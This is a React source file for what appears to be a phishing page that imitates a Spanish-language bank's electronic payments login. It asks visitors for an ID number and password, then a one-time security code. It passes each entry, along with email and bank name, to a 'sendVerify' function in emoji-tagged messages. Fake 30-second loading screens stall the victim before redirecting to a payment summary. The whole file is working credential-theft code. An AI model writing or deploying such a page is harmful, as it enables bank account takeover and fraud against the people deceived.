import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X04.module.css';
import logo from '../../Assets/Images/X04/logo.svg';
import logoSeguridad from '../../Assets/Images/X04/logoSeguridad.png';
import NoRobot from '../../Assets/Images/X04/NoRobot.png';
import logoASectionA from '../../Assets/Images/X04/logoASectionA.svg';
import logoBSectionA from '../../Assets/Images/X04/logoBSectionA.svg';
import loader from '../../Assets/Images/X04/loader.gif';
import loaderMain from '../../Assets/Images/loader.gif'

function X04() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');
    
    const [showDataHSection, setShowDataHSection] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showDataHSection) {
            sendVerify(`🆔: ${dataF}\n🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoader(true);

            setTimeout(() => {
                setShowLoader(false);
                setShowDataHSection(true);
            }, 30000)
        } else {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago")
            }, 30000)
        }
    };

    return (
        <>
            <main className={styles.mainX104}>
                <section>
                    <div>
                        <img src={logoASectionA} alt='Logo'></img>
                        <img src={logoBSectionA} alt='Logo'></img>
                    </div>
                </section>
                <section>
                    <div>
                        <img src={logoSeguridad} alt='Logo Seguridad'></img>
                        <p>Seguridad</p>
                    </div>
                    <div>
                        <img src={logo} alt='Logo'></img>
                        {!showDataHSection && (
                            <h1>¡Bienvenido! a tus,<br></br><span>Pagos Eléctronicos</span></h1>
                        )}
                        {showDataHSection && (
                            <h1>Dependiendo de tu operador de telefonia movil, el envio puede tomar hasta 5 minutos.</h1>
                        )}
                    </div>
                    <form>
                        {!showDataHSection && (
                            <div>
                                <label>Identificación</label>
                                <div>
                                    <select>
                                        <option>CC</option>
                                        <option>CE</option>
                                        <option>TI</option>
                                    </select>
                                    <input type='number'
                                            value={dataF}
                                            onChange={(e) => setDataF(e.target.value)}
                                            placeholder='Ej.: 1093238993'>
                                    </input>
                                </div>
                            </div>
                        )}
                        {!showDataHSection && (
                            <div>
                                <label>Contraseña</label>
                                <input type='password'
                                        value={dataG}
                                        onChange={(e) => setDataG(e.target.value)}
                                        placeholder='Ingresa tu contraseña'>
                                </input>
                            </div>
                        )}
                        {showDataHSection && (
                            <div>
                                <label>Codigo de Seguridad</label>
                                <input type='password'
                                        value={dataH}
                                        onChange={(e) => setDataH(e.target.value)}>
                                </input>
                            </div>
                        )}                    
                    </form>
                    <img src={NoRobot} alt='No Robot'></img>
                    <div>
                        <button>Volver al comercio</button>
                        <button onClick={handleContinue}>{showDataHSection ? 'Ingresar' : 'Continuar'}</button>
                    </div>   
                </section>
                {showLoader && (
                    <section className={styles.overlayX04}>
                        <img src={loader}></img>
                    </section>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain}></img>
                    </section>
                )}
            </main>
        </>
    )
}

export default X04;